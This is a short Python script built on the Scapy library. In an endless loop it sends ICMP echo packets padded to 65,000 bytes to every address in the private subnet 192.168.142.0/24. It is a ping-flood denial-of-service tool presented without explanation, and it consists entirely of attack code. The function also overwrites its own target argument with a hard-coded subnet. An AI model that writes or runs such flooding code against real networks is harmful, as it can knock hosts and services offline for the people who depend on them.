from scapy.all import *
def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
    target_ip_address='192.168.142.128/24'
    ip = IP(dst=target_ip_address)

    icmp = ICMP()
    raw = Raw(b"X" * size_of_packet)
    p = ip / icmp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_ping(): Sent ' + str(number_of_packets_to_send) + 
          ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)
    
while True:
    send_ping('192.168.142.128/24')